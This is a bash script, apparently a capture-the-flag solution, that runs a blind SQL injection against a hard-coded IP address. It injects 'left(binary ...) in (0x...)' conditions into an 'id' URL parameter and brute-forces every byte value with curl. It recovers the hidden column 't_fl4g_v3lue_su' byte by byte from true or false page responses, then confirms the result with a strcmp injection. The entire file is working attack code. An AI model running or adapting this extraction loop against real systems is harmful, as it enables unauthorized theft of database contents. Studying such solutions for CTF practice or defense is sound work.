#!/bin/bash
#chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_*<#{}"
for i in 0
do
	val=""
	val_ascii=""
	for (( j=57; ; j++))
	do
		#for (( k=0; k<${#chars}; k++ ))
		for k in {0..255}
		do
			#k_hex=$(echo -n ${chars:k:1}|xxd -p)
			k_hex=$(printf "%x" $k)
			query="http://45.77.255.164/?id=$i||left(binary+t_fl4g_v3lue_su,$j)+in+(0x$val$k_hex)"
			echo "Testing $query"
			result=$(curl -sS $query|grep "_")
			#echo $result
			if [[ $result != "" ]]
			then
				val="$val$k_hex"
				val_ascii="$val_ascii\x$k_hex"
				break
			fi
			#echo "The value of k is $k"
		done
		echo $val
		echo -e $val_ascii
		query="http://45.77.255.164/?id=$i||strcmp(t_fl4g_v3lue_su,$val)+is+false"
		result=$(curl -sS $query|grep "_")
		if [[ $result != "" ]]
		then
				break
		fi
	done
done
